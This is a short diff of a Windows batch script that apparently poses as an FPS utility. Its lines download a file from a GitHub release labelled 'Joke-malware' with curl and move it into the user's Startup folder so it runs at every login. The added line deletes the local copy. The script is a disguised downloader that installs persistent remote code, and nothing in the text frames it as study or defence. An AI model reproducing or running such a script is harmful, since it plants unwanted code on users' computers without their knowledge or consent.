@@ -5,6 +5,7 @@ cls
 curl -O https://github.com/GreatNate0509YT/Other/releases/download/Joke-malware/sysfps.bat
 cls
 move sysfps.bat %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sysfps.bat
+del sysfps.bat
 :start
 cls
 echo fps
